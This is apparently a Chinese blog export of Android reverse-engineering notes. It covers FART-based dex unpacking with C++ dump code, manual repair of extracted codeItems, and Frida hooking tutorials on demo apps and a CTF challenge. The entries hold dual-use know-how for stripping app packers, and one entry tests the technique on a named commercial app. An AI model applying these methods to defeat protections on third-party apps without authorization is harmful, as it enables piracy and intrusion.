<p>主动调用组件：通过主动调用让壳自己把抽取的函数代码还原回来，可以用这种方法补完函数体内容</p>
<p>修复组件：将整体结构和函数内容做一个整合，修复完整的dex</p>
</li>
<li><p>FART也是可以脱Dalvik类型的壳的，不过现在Dalvik几乎已经见不到了</p>
</li>
</ul>
<p>脱壳组件部分可以参考我们前面几章分析源码的时候找到的脱壳点：</p>
<img src="/2023/09/26/FART%E4%B8%AD%E7%9A%84%E8%84%B1%E5%A3%B3%E7%82%B9-%E8%84%B1%E5%A3%B3%E7%BB%84%E4%BB%B6/image-20230926114731848.png" class="" title="image-20230926114731848">

<p>dex2oat的编译过程最后会调用CompileMethod()将函数编译为二进制代码</p>
<img src="/2023/09/26/FART%E4%B8%AD%E7%9A%84%E8%84%B1%E5%A3%B3%E7%82%B9-%E8%84%B1%E5%A3%B3%E7%BB%84%E4%BB%B6/image-20230926115204265.png" class="" title="image-20230926115204265">

<ul>
<li>在编译之前会对dex中的方法进行检查，检查符合编译条件的将其编译为二进制代码。在<em>else</em>中看到用来<strong>初始化的方法是不需要进行编译的</strong></li>
</ul>
<h3 id="初始化方法的执行流程"><a href="#初始化方法的执行流程" class="headerlink" title="初始化方法的执行流程"></a>初始化方法的执行流程</h3><p>先暂停捋一下初始化方法的执行流程</p>
<blockquote>
<p>在ART下有两种函数执行模式</p>
<ol>
<li>interpreter模式：由ART下的解释器解释执行</li>
<li>quick模式：直接运行dex2oat编译生成的arm指令</li>
</ol>
<p>不论壳有没有执行dex2oat，它的初始化方法始终是运行在interpreter模式下的。所以它必须经过ART下的解释器去取出code_item中的每一条smali指令，然后解释执行。</p>
<p>ART的解释器在不同的Android版本中有不同的实现：</p>
<img src="/2023/09/26/FART%E4%B8%AD%E7%9A%84%E8%84%B1%E5%A3%B3%E7%82%B9-%E8%84%B1%E5%A3%B3%E7%BB%84%E4%BB%B6/image-20230926121235169.png" class="" title="image-20230926121235169">

<center>Android 13.0没有这个解释器了</center>

<img src="/2023/09/26/FART%E4%B8%AD%E7%9A%84%E8%84%B1%E5%A3%B3%E7%82%B9-%E8%84%B1%E5%A3%B3%E7%BB%84%E4%BB%B6/image-20230926121323952.png" class="" title="image-20230926121323952">

<center>Android 12~8</center>

<ul>
<li>8~12解释器有两种实现，一种是switch结构另一种是汇编结构的。默认使用汇编结构</li>
</ul>
<img src="/2023/09/26/FART%E4%B8%AD%E7%9A%84%E8%84%B1%E5%A3%B3%E7%82%B9-%E8%84%B1%E5%A3%B3%E7%BB%84%E4%BB%B6/image-20230926121411911.png" class="" title="image-20230926121411911">

<center>Android 7</center>

<ul>
<li>在7.0中还有另外一种通过go-to跳转表的实现</li>
</ul>
</blockquote>
<p><strong>本次我们的测试设备使用的是Android8.0</strong></p>
<p>在ART中，每个Java方法（包括构造函数/初始化函数）都有对应的<strong>art method</strong>对象。这个method对象包含了method的信息，例如method的字节码指令、参数类型、返回类型等。</p>
<p>ART method对象提供了一个<code>GetDexFile</code>方法，可以用来获取当前方法所属的DexFile对象。</p>
<img src="/2023/09/26/FART%E4%B8%AD%E7%9A%84%E8%84%B1%E5%A3%B3%E7%82%B9-%E8%84%B1%E5%A3%B3%E7%BB%84%E4%BB%B6/image-20230926154553095.png" class="" title="image-20230926154553095">

<p>可以在源码中查看DexFile对象，里面包含有Begin()和Size()两个函数</p>
<img src="/2023/09/26/FART%E4%B8%AD%E7%9A%84%E8%84%B1%E5%A3%B3%E7%82%B9-%E8%84%B1%E5%A3%B3%E7%BB%84%E4%BB%B6/image-20230926155642205.png" class="" title="image-20230926155642205">

<ul>
<li>有了这两个函数我们就可以获取到当前dex在内存中的起始地址和大小了</li>
</ul>
<h3 id="编写脱壳组件"><a href="#编写脱壳组件" class="headerlink" title="编写脱壳组件"></a>编写脱壳组件</h3><p>接下来可以通过这个链条，来dump初始化的时候映射在内存中的dex</p>
<blockquote>
<p>通过ART method对象 → GetDexFile获取到DexFile → DexFile中的Begin()和Size()获取到dex</p>
</blockquote>
<pre><code class="c++">ArtMethod* artmethod = shadow_frame.GetMethod();
if(strstr(artmethod-&gt;PrettyMethod().c_str(),"&lt;clinit&gt;")){
    // inline const DexFile* ArtMethod::GetDexFile()
    const DexFile* dexfile = artmethod-&gt;GetDexFile();
    /*
    const uint8_t* Begin() const {
    return begin_;
    }

    size_t Size() const {
    return size_;
    }
    */
    const uint8_t* begin = dexfile-&gt;Begin();
    size_t size = dexfile-&gt;Size();

    char dexfilepath[100] = {0};
    sprintf(dexfilepath, "/sdcard/%d_%d_Excute.dex", (int)size, getpid());
    int fd = open(dexfilepath, O_CREAT|O_RDWR, 0666);
    if(fd &gt; 0){
        int number = write(fd, begin, size);
        if(number &gt; 0){};
        close(fd);
        }
    }
</code></pre>
<img src="/2023/09/26/FART%E4%B8%AD%E7%9A%84%E8%84%B1%E5%A3%B3%E7%82%B9-%E8%84%B1%E5%A3%B3%E7%BB%84%E4%BB%B6/image-20230926162456351.png" class="" title="image-20230926162456351">

<h3 id="测试脱壳组件"><a href="#测试脱壳组件" class="headerlink" title="测试脱壳组件"></a>测试脱壳组件</h3><p>将源码重新编译 &gt; 刷入设备 &gt; 运行目标app脱壳</p>
<ul>
<li>测试货拉拉那个带函数抽取的壳</li>
</ul>
<img src="/2023/09/26/FART%E4%B8%AD%E7%9A%84%E8%84%B1%E5%A3%B3%E7%82%B9-%E8%84%B1%E5%A3%B3%E7%BB%84%E4%BB%B6/image-20230926163312190.png" class="" title="image-20230926163312190">

<img src="/2023/09/26/FART%E4%B8%AD%E7%9A%84%E8%84%B1%E5%A3%B3%E7%82%B9-%E8%84%B1%E5%A3%B3%E7%BB%84%E4%BB%B6/image-20230926163317538.png" class="" title="image-20230926163317538">

<ul>
<li>整体框架dump没有问题，但是里面的函数体还是空的</li>
</ul>
<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>在ART中有很多地方都可以当作脱壳点，可以参考hanbingle大佬在看雪的帖子：</p>
<p><a href="https://bbs.kanxue.com/thread-254555.htm">拨云见日：安卓APP脱壳的本质以及如何快速发现ART下的脱壳点</a></p>
<p><a href="https://bbs.kanxue.com/thread-254028.htm">FART正餐前甜点：ART下几个通用简单高效的dump内存中dex方法</a></p>
<img src="/2023/09/26/FART%E4%B8%AD%E7%9A%84%E8%84%B1%E5%A3%B3%E7%82%B9-%E8%84%B1%E5%A3%B3%E7%BB%84%E4%BB%B6/image-20230926163851954.png" class="" title="image-20230926163851954">

<img src="/2023/09/26/FART%E4%B8%AD%E7%9A%84%E8%84%B1%E5%A3%B3%E7%82%B9-%E8%84%B1%E5%A3%B3%E7%BB%84%E4%BB%B6/image-20230926163935009.png" class="" title="image-20230926163935009">
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>FART脱壳</tag>
        <tag>脱壳组件</tag>
      </tags>
  </entry>
  <entry>
    <title>FART使用场景和流程</title>
    <url>/2023/10/01/FART%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF%E5%92%8C%E6%B5%81%E7%A8%8B/</url>
    <content><![CDATA[<p>本章主要介绍一下什么是FART、为什么要使用FART，以及如何使用FART的问题</p>
<p>FART是一个支持在ART（Android runtime)下使用的脱壳框架，可以用来解决函数抽取壳的问题。支持在Dalvik和ART下运行。</p>
<span id="more"></span>

<h2 id="脱壳方式"><a href="#脱壳方式" class="headerlink" title="脱壳方式"></a>脱壳方式</h2><p>现在新一代的Android加壳基本都做了函数抽取实现了函数粒度的加壳，我们之前使用的脱壳组件只能从内存中将dex的整体框架dump出来，如果碰到函数抽取壳，dump下来的函数体都是空的。</p>
<img src="/2023/10/01/FART%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF%E5%92%8C%E6%B5%81%E7%A8%8B/image-20231001095254872.png" class="" title="image-20231001095254872">

<p>FART的解决办法是找到函数体的codeItem将其回填进函数体中，有两种思路可以完成这种回填：</p>
<ul>
<li>被动调用：在执行的过程中等待被动调用，因为运行过程中不一定所有的函数都会被调用，所以会有代码覆盖率低的问题</li>
<li>主动模拟调用：通过构造虚拟调用，让壳误以为app在执行正常的函数调用流程从而达成对dex中所有类函数的虚拟调用。能够覆盖dex中所有的函数，修复更完整。修复的准确度和主动调用链的构造深度有关。</li>
</ul>
<h2 id="codeItem"><a href="#codeItem" class="headerlink" title="codeItem"></a>codeItem</h2><p>我们知道函数的逻辑代码都在codeItem中，所以我们的重点就在于准确的获取函数的codeItem。</p>
<img src="/2023/10/01/FART%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF%E5%92%8C%E6%B5%81%E7%A8%8B/image-20231001100415348.png" class="" title="image-20231001100415348">

<p>这其中的重点在于获取codeItem的长度，它的长度不是固定的跟try_catch指令列表的大小有关。</p>
<ul>
<li><p><strong>没有try_catch：</strong>codeItem长度 = （ushort registersSize ~ uint insnsSize）共16个字节 + uint insnsSize * 2</p>
<img src="/2023/10/01/FART%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF%E5%92%8C%E6%B5%81%E7%A8%8B/image-20231001100739368.png" class="" title="image-20231001100739368">

<ul>
<li>在这里就是<strong>16 + 10*2 = 36</strong></li>
</ul>
</li>
<li><p><strong>有try_catch：</strong></p>
<p><strong>codeItem长度 = 16 + uint insns_size*2 + try_catch长度</strong></p>
<img src="/2023/10/01/FART%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF%E5%92%8C%E6%B5%81%E7%A8%8B/image-20231001102500999.png" class="" title="image-20231001102500999"></li>
</ul>
<h2 id="手动修复函数抽取dex"><a href="#手动修复函数抽取dex" class="headerlink" title="手动修复函数抽取dex"></a>手动修复函数抽取dex</h2><p>FART运行之后我们可以得到dex和bin（codeItem）文件</p>
<img src="/2023/10/01/FART%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF%E5%92%8C%E6%B5%81%E7%A8%8B/image-20231001105254320.png" class="" title="image-20231001105254320">

<img src="/2023/10/01/FART%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF%E5%92%8C%E6%B5%81%E7%A8%8B/image-20231001105301966.png" class="" title="image-20231001105301966">

<p>手动修复有三种办法：</p>
<ol>
<li><p>在GDA中定位到我们要修复的函数（找到函数然后查看其16进制，就能直接定位到函数位置），用定位到的地址在dex中搜索（用010edit打开CTRL+G搜索地址），然后在对应的bin文件中通过搜索找到函数体的codeItem字符串，将codeItem字符串填充到dex文件中。</p>
</li>
<li><p>在bin文件中找到五元组中的<em>offset值</em>，将值转为16进制在用010打开的dex中搜索地址，然后将codeItem字符串填充过去。</p>
</li>
<li><p>在bin文件中把要修复的函数的codeItem字符串编码拷贝出来解码，将解码后的codeItem覆盖dex文件中原函数<em>offset</em>位置。</p>
</li>
</ol>
<h3 id="手动修复测试"><a href="#手动修复测试" class="headerlink" title="手动修复测试"></a>手动修复测试</h3><p>用FART跑完会dump下来很多的dex文件，可以用命令定位一下函数体在哪个dex中</p>
<p><code>grep -r "MemoryCache" ./*.txt</code></p>
<img src="/2023/10/01/FART%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF%E5%92%8C%E6%B5%81%E7%A8%8B/image-20231001111342888.png" class="" title="image-20231001111342888">

<p>用GDA打开找一个被抽取的函数进行测试</p>
<img src="/2023/10/01/FART%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF%E5%92%8C%E6%B5%81%E7%A8%8B/image-20231001160249523.png" class="" title="image-20231001160249523">

<p>在bin文件里面搜索<strong>getFunctionName</strong>，将这个函数的base64字符串拷贝出来解码</p>
<img src="/2023/10/01/FART%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF%E5%92%8C%E6%B5%81%E7%A8%8B/image-20231001180758244.png" class="" title="image-20231001180758244">

<p>解码</p>
<pre><code class="python">import base64
def decodeContent(content,filepath): #删除缩进(Tab)
    try:
        bytearray_str = base64.b64decode(content)
        binfile=open(filepath,"ab+")
        binfile.write(bytearray_str)
        binfile.close()
    except Exception as e:
        print(e)

    return


if __name__ == '__main__':
    b64content="CAABAAMAAADkIBoAdwAAABICcQBtaAAADANuEHRoAwAMATkBAwARAiEUEgM1Q/3/RgABA24Q/GcAAAoFOAUFANgDAwEo9G4Q+GcAAAwFHAY8Dm4QXmcGAAwGbiANaGUACgU5Be//bhD4ZwAADAVuENtnBwAMBm4QXmcGAAwGbiANaGUACgU5Bd3/IgI4DhoDPDVwIEtoMgBxAG1oAAAMA24QcWgDAAsDbjBQaDIEDAIaAx4FbiBTaDIADAJuEPlnAAAMA24gU2gyAAwCGgMdBW4gU2gyAAwCbhD6ZwAACgNuIE9oMgAMAhoDjzduIFNoMgAMAm4QW2gCAAwCKJU="
    decodeContent(b64content,"checkSize.bin")
</code></pre>
<p>把解码后的hex覆盖dex中的偏移位置</p>
<img src="/2023/10/01/FART%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF%E5%92%8C%E6%B5%81%E7%A8%8B/image-20231001181055378.png" class="" title="image-20231001181055378">

<p>覆盖（注意覆盖的字节数不要弄错）</p>
<img src="/2023/10/01/FART%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF%E5%92%8C%E6%B5%81%E7%A8%8B/image-20231002155249518.png" class="" title="image-20231002155249518">

<p>保存后用GDA查看</p>
<img src="/2023/10/01/FART%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF%E5%92%8C%E6%B5%81%E7%A8%8B/image-20231001181331324.png" class="" title="image-20231001181331324">

<hr>
<h2 id="FART使用流程"><a href="#FART使用流程" class="headerlink" title="FART使用流程"></a>FART使用流程</h2><p>FART脱壳和定位dex就前面说过了，不再重复</p>
<p>使用<a href="https://github.com/xiaoeeyu/FART_repairComponent/tree/main">脚本</a>将dex文件修复一下 </p>
<p><code>python fart.py -d XXX.dex -i xxx.bin&gt;&gt;XXX.txt</code></p>
<img src="/2023/10/01/FART%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF%E5%92%8C%E6%B5%81%E7%A8%8B/image-20231001174246279.png" class="" title="image-20231001174246279">

<img src="/2023/10/01/FART%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF%E5%92%8C%E6%B5%81%E7%A8%8B/image-20231001174946682.png" class="" title="image-20231001174946682">
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>FART脱壳</tag>
      </tags>
  </entry>
  <entry>
    <title>Frida上手和逆向三段</title>
    <url>/2023/11/17/Frida%E4%B8%8A%E6%89%8B%E5%92%8C%E9%80%86%E5%90%91%E4%B8%89%E6%AE%B5/</url>
    <content><![CDATA[<p>本章主要内容：</p>
<blockquote>
<p>Frida基本操作：参数、调用栈、返回值</p>
<p>Frida精髓：方法重载、参数构造、动静态处理、主动调用、忽略内部细节，直接返回结果</p>
<p>逆向三段：（hook ・invoke）・rpc</p>
</blockquote>
<span id="more"></span>

<h2 id="编写代码测试hook"><a href="#编写代码测试hook" class="headerlink" title="编写代码测试hook"></a>编写代码测试hook</h2><p>新建一个java类型的项目</p>
<img src="/2023/11/17/Frida%E4%B8%8A%E6%89%8B%E5%92%8C%E9%80%86%E5%90%91%E4%B8%89%E6%AE%B5/image-20231117195136260.png" class="" title="image-20231117195136260">

<center>图0</center>

<h6 id="目标Demo源码"><a href="#目标Demo源码" class="headerlink" title="目标Demo源码"></a>目标Demo源码</h6><pre><code class="java">package com.xiaoeryu.lesson4_4;

import androidx.appcompat.app.AppCompatActivity;

import android.os.Bundle;
import android.util.Log;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        while (true){
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                throw new RuntimeException(e);
            }
            int m = fun(4, 5);

        }
    }

    int fun(int x, int y){
        Log.d("xiaoeryu", String.valueOf(x + y));
        return x + y;
    }

}
</code></pre>
<h3 id="hook被调用的fun-函数"><a href="#hook被调用的fun-函数" class="headerlink" title="hook被调用的fun()函数"></a>hook被调用的<code>fun()</code>函数</h3><pre><code class="js">function main(){
    Java.perform(function(){
        Java.use("com.xiaoeryu.lesson4_4.MainActivity").fun.implementation = function(arg1, arg2){
            var result = this.fun(arg1, arg2);
            console.log("arg1, arg2, result", arg1, arg2, result);
            return result;
        }
    })
}

setImmediate(main)
</code></pre>
<h3 id="方法重载hook"><a href="#方法重载hook" class="headerlink" title="方法重载hook"></a>方法重载hook</h3><h6 id="给源码添加一个重载函数，并调用"><a href="#给源码添加一个重载函数，并调用" class="headerlink" title="给源码添加一个重载函数，并调用"></a>给源码添加一个重载函数，并调用</h6><pre><code class="java">    int fun(int x, int y){
        Log.d("xiaoeryu", String.valueOf(x + y));
        return x + y;
    }
</code></pre>
<h6 id="有重载情况下的hook"><a href="#有重载情况下的hook" class="headerlink" title="有重载情况下的hook"></a>有重载情况下的hook</h6><pre><code class="js">function main(){
    Java.perform(function(){
        // overloading with two parameters
        Java.use("com.xiaoeryu.lesson4_4.MainActivity").fun.overload('int', 'int').implementation = function(arg1, arg2){
            var result = this.fun(100, 200);    // parameters can be changed
            console.log(Java.use("android.util.Log").getStackTraceString(Java.use("java.lang.Throwable").$new()));	// print call stack
            console.log("arg1, arg2, result", arg1, arg2, result);
            return result;
        }
        // overloading with a one parameter
        Java.use("com.xiaoeryu.lesson4_4.MainActivity").fun.overload('java.lang.String').implementation = function(arg1){
            var result = this.fun(Java.use('java.lang.String').$new('NIHAO'));  // parameters can be changed
            console.log("arg1, result", arg1, result);
            return result;
        }
    })
}

setImmediate(main)
</code></pre>
<h3 id="主动调用未被调用的函数"><a href="#主动调用未被调用的函数" class="headerlink" title="主动调用未被调用的函数"></a>主动调用未被调用的函数</h3><img src="/2023/11/17/Frida%E4%B8%8A%E6%89%8B%E5%92%8C%E9%80%86%E5%90%91%E4%B8%89%E6%AE%B5/image-20231117185353103.png" class="" title="image-20231117185353103">

<center>图一</center>

<h6 id="hook方法"><a href="#hook方法" class="headerlink" title="hook方法"></a>hook方法</h6><pre><code class="js">        Java.choose("com.xiaoeryu.lesson4_4.MainActivity",{
            onMatch:function(instance){
                console.log("found instance: ", instance)
                console.log("found instance: ", instance.secret())
            },onComplete:function(){}
        })
</code></pre>
<h6 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h6><img src="/2023/11/17/Frida%E4%B8%8A%E6%89%8B%E5%92%8C%E9%80%86%E5%90%91%E4%B8%89%E6%AE%B5/image-20231117185612409.png" class="" title="image-20231117185612409">

<center>图二</center>

<p>如果是静态方法的话，会更简单点</p>
<h6 id="hook方法-1"><a href="#hook方法-1" class="headerlink" title="hook方法"></a>hook方法</h6><pre><code class="js">var result = Java.use("com.xiaoeryu.lesson4_4.MainActivity").secret2();
        console.log(result);
</code></pre>
<hr>
<h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><p><strong>把各种情况分析完了，用上一章测试用的CTF题目来实践一下</strong></p>
<p><em>在hook的时候如果是动态方法的话，我们需要去搜索实例，如果是静态方法直接调用就ok</em></p>
<img src="/2023/11/17/Frida%E4%B8%8A%E6%89%8B%E5%92%8C%E9%80%86%E5%90%91%E4%B8%89%E6%AE%B5/image-20231117185928058.png" class="" title="image-20231117185928058">

<center>图三</center>

<ul>
<li><p>用jadx可以看到我们要调用的<code>a方法</code>没有static修饰，是一个动态方法</p>
</li>
<li><p>这样的话我们就需要在<code>MainActivity</code>类中去搜索它的实例去调用</p>
</li>
</ul>
<p>上一章已经分析过了，我们要hook的是里面的<code>getWritableDatabase</code>函数</p>
<img src="/2023/11/17/Frida%E4%B8%8A%E6%89%8B%E5%92%8C%E9%80%86%E5%90%91%E4%B8%89%E6%AE%B5/image-20231117190515462.png" class="" title="image-20231117190515462">

<center>图四</center>

<ul>
<li>可以看到这个函数有重载，对于有重载的方法如果我们不确定应该hook哪一个就可以全部都hook</li>
</ul>
<h6 id="hook方法-2"><a href="#hook方法-2" class="headerlink" title="hook方法"></a>hook方法</h6><img src="/2023/11/17/Frida%E4%B8%8A%E6%89%8B%E5%92%8C%E9%80%86%E5%90%91%E4%B8%89%E6%AE%B5/image-20231117192633622.png" class="" title="image-20231117192633622">

<center>图五</center>

<ul>
<li>可以看到报错提示有重载，修改一下脚本hook这两个重载</li>
</ul>
<img src="/2023/11/17/Frida%E4%B8%8A%E6%89%8B%E5%92%8C%E9%80%86%E5%90%91%E4%B8%89%E6%AE%B5/image-20231117192340047.png" class="" title="image-20231117192340047">

<center>图六</center>

<ul>
<li>修改完就不报错了，但是因为没有调用所以我们也获取不到想要的信息</li>
</ul>
<h6 id="在MainActivity中搜索实例a并调用"><a href="#在MainActivity中搜索实例a并调用" class="headerlink" title="在MainActivity中搜索实例a并调用"></a>在MainActivity中搜索实例a并调用</h6><pre><code class="js">function invoke(){
    Java.perform(function(){
        Java.choose("com.example.yaphetshan.tencentwelcome.MainActivity", {
            onMatch:function(instance){
                console.log("found instance ", instance);
                console.log("invoke instance.a ", instance.a());
            }, onComplete:function(){console.log("search completed!")}
        })
    })
}
</code></pre>
<p>实现完成<code>CTRL+S</code>保存一遍就执行了</p>
<img src="/2023/11/17/Frida%E4%B8%8A%E6%89%8B%E5%92%8C%E9%80%86%E5%90%91%E4%B8%89%E6%AE%B5/image-20231117193201460.png" class="" title="image-20231117193201460">

<ul>
<li>可以看到密码已经被我们成功的拿到了</li>
<li>并且可以看到是通过参数为String的重载拿到的</li>
<li>顺便也打印它的调用堆栈看一下</li>
</ul>
<p>附件：</p>
<blockquote>
<p><a href="https://github.com/xiaoeeyu/lesson4_4">测试hook的Demo源码</a></p>
<p><a href="https://github.com/xiaoeeyu/lesson4_4_hook">hook脚本源码</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>Frida逆向与利用自动化</tag>
        <tag>Frida Hook</tag>
      </tags>
  </entry>
  <entry>
    <title>Frida构造数组、对象、Map和类参数</title>
    <url>/2023/11/18/Frida%E6%9E%84%E9%80%A0%E6%95%B0%E7%BB%84%E3%80%81%E5%AF%B9%E8%B1%A1%E3%80%81Map%E5%92%8C%E7%B1%BB%E5%8F%82%E6%95%B0/</url>
    <content><![CDATA[<p>本章主要内容为hook后参数如何打印和构造</p>
<p>环境：</p>
<blockquote>
<p>设备：pixel XL</p>
<p>系统版本：Android 7.1</p>
</blockquote>
<span id="more"></span>

<h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><h6 id="改变app的返回结果"><a href="#改变app的返回结果" class="headerlink" title="改变app的返回结果"></a>改变app的返回结果</h6><p>源码片段</p>
<pre><code class="java">char arr[][] = new char[4][]; // 创建一个4行的二维数组
        arr[0] = new char[] { '春', '眠', '不', '觉', '晓' }; // 为每一行赋值
        arr[1] = new char[] { '处', '处', '闻', '啼', '鸟' };
        arr[2] = new char[] { '夜', '来', '风', '雨', '声' };
        arr[3] = new char[] { '花', '落', '知', '多', '少' };
        Log.d("SimpleArray", "-----横版-----");
        for (int i = 0; i &lt; 4; i++) { // 循环4行
//            Log.d("SimpleArraysToString", Arrays.toString(arr[i]));
//            Log.d("SimpleStringBytes", Arrays.toString (Arrays.toString (arr[i]).getBytes()));
            for (int j = 0; j &lt; 5; j++) { // 循环5列
                Log.d("SimpleArray", Character.toString(arr[i][j])); // 输出数组中的元素
            }
            if (i % 2 == 0) {
                Log.d("SimpleArray", ",");// 如果是一、三句，输出逗号
            } else {
                Log.d("SimpleArray", "。");// 如果是二、四句，输出句号
            }
        }
</code></pre>
<ul>
<li><p>hook<code>Character.toString()</code>获取参数和返回值并改变返回结果</p>
<blockquote>
<img src="/2023/11/18/Frida%E6%9E%84%E9%80%A0%E6%95%B0%E7%BB%84%E3%80%81%E5%AF%B9%E8%B1%A1%E3%80%81Map%E5%92%8C%E7%B1%BB%E5%8F%82%E6%95%B0/image-20231118223637807.png" class="" title="image-20231118223637807">
</blockquote>
</li>
<li><p>hook<code>charArrays.toString()</code></p>
<blockquote>
<img src="/2023/11/18/Frida%E6%9E%84%E9%80%A0%E6%95%B0%E7%BB%84%E3%80%81%E5%AF%B9%E8%B1%A1%E3%80%81Map%E5%92%8C%E7%B1%BB%E5%8F%82%E6%95%B0/image-20231118223800036.png" class="" title="image-20231118223800036">

<ul>
<li><p>这里的X值因为格式的问题打印不出来，使用<code>JSON.stringify()</code>方法来打印</p>
<img src="/2023/11/18/Frida%E6%9E%84%E9%80%A0%E6%95%B0%E7%BB%84%E3%80%81%E5%AF%B9%E8%B1%A1%E3%80%81Map%E5%92%8C%E7%B1%BB%E5%8F%82%E6%95%B0/image-20231118223947493.png" class="" title="image-20231118223947493"></li>
</ul>
</blockquote>
</li>
<li><p>hook<code>charArray.getBytes()</code></p>
<blockquote>
<img src="/2023/11/18/Frida%E6%9E%84%E9%80%A0%E6%95%B0%E7%BB%84%E3%80%81%E5%AF%B9%E8%B1%A1%E3%80%81Map%E5%92%8C%E7%B1%BB%E5%8F%82%E6%95%B0/image-20231118224238240.png" class="" title="image-20231118224238240">

<ul>
<li>有点奇怪，在搜索实例的时候出现了搜索不到的情况，要等app运行了很久（大概一个小时左右了）才能搜索到实例。看报错是编译优化导致的找不到类名。应该是设备或者系统版本的问题。没搜索到类似的问题，回头测试一下</li>
<li><strong>之前是Android 10.0换了7.1没有这个问题了</strong></li>
</ul>
</blockquote>
</li>
</ul>
<h3 id="对象-x2F-多态、强转"><a href="#对象-x2F-多态、强转" class="headerlink" title="对象/多态、强转"></a>对象/多态、强转</h3><p><strong>子类可以强转为父类，父类不能强转为子类</strong></p>
<img src="/2023/11/18/Frida%E6%9E%84%E9%80%A0%E6%95%B0%E7%BB%84%E3%80%81%E5%AF%B9%E8%B1%A1%E3%80%81Map%E5%92%8C%E7%B1%BB%E5%8F%82%E6%95%B0/image-20231118224940766.png" class="" title="image-20231118224940766">

<ul>
<li>子类强转为父类ok</li>
</ul>
<h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><p>也可以在hook代码中实现接口</p>
<img src="/2023/11/18/Frida%E6%9E%84%E9%80%A0%E6%95%B0%E7%BB%84%E3%80%81%E5%AF%B9%E8%B1%A1%E3%80%81Map%E5%92%8C%E7%B1%BB%E5%8F%82%E6%95%B0/image-20231118225044474.png" class="" title="image-20231118225044474">





<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><h6 id="获取枚举的实例和类"><a href="#获取枚举的实例和类" class="headerlink" title="获取枚举的实例和类"></a>获取枚举的实例和类</h6><img src="/2023/11/18/Frida%E6%9E%84%E9%80%A0%E6%95%B0%E7%BB%84%E3%80%81%E5%AF%B9%E8%B1%A1%E3%80%81Map%E5%92%8C%E7%B1%BB%E5%8F%82%E6%95%B0/image-20231118225148951.png" class="" title="image-20231118225148951">

<h3 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h3><h6 id="打印以及hook-Map"><a href="#打印以及hook-Map" class="headerlink" title="打印以及hook Map"></a>打印以及hook Map</h6><p>Map的源码片段</p>
<pre><code class="java">        Map&lt;String, String&gt; mapr0ysue = new HashMap&lt;&gt;(); // 创建Map集合对象
        mapr0ysue.put("xiaoeryu 1", "张三"); // 向Map集合中添加元素
        mapr0ysue.put("xiaoeryu 2", "李四");
        mapr0ysue.put("xiaoeryu 3", "王五");
        mapr0ysue.put("xiaoeryu 4", "赵六");

        Log.d("5map", "key值toString"+mapr0ysue.toString());
</code></pre>
<p>打印Map</p>
<img src="/2023/11/18/Frida%E6%9E%84%E9%80%A0%E6%95%B0%E7%BB%84%E3%80%81%E5%AF%B9%E8%B1%A1%E3%80%81Map%E5%92%8C%E7%B1%BB%E5%8F%82%E6%95%B0/image-20231119233324076.png" class="" title="image-20231119233324076">

<ul>
<li>打印可以使用命令<code>frida -U com.xiaoeryu.printout -l lesson5.js</code>加载脚本就打印出来了</li>
</ul>
<p>hook的话需要添加<code>-f</code>参数重新启动才能hook到</p>
<p>命令：<code>frida -U -f com.xiaoeryu.printout -l lesson5.js --no-pause</code></p>
<img src="/2023/11/18/Frida%E6%9E%84%E9%80%A0%E6%95%B0%E7%BB%84%E3%80%81%E5%AF%B9%E8%B1%A1%E3%80%81Map%E5%92%8C%E7%B1%BB%E5%8F%82%E6%95%B0/image-20231119233616888.png" class="" title="image-20231119233616888">



<p>测试Demo<a href="https://github.com/xiaoeeyu/printout">源码</a></p>
<p>hook<a href="https://github.com/xiaoeeyu/printout_hook">脚本</a></p>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>Frida逆向与利用自动化</tag>
        <tag>Frida Hook</tag>
        <tag>处理各种参数的方法</tag>
      </tags>
  </entry>
  <entry>
    <title>Frida基础hook汇总</title>
    <url>/2024/03/24/Frida%E5%9F%BA%E7%A1%80hook%E6%B1%87%E6%80%BB/</url>
    <content><![CDATA[<p>本章主要总结对Java层代码以及native代码的hook</p>
<ul>
<li>Java以及Native函数的hook以及主动调用</li>
<li>Native静态注册函数参数、返回值打印和替换</li>
</ul>
<span id="more"></span>

<p>这里对自己写的demo为例进行hook（代码中包含了Java、JNI、C各种实现），源码链接放文末附件。</p>
<p>安装Frida的源码包，可以方便写Frida的时候随时查看函数实现</p>
<p><code>npm install --save @types/frida-gum</code></p>
<h3 id="基础hook"><a href="#基础hook" class="headerlink" title="基础hook"></a>基础hook</h3><p>包括Java层和native层的基础hook</p>
<h4 id="Java层的静态函数"><a href="#Java层的静态函数" class="headerlink" title="Java层的静态函数"></a>Java层的静态函数</h4><img src="/2024/03/24/Frida%E5%9F%BA%E7%A1%80hook%E6%B1%87%E6%80%BB/image-20240813223700885.png" class="" title="image-20240813223700885">



<p>hook和主动调用的代码</p>
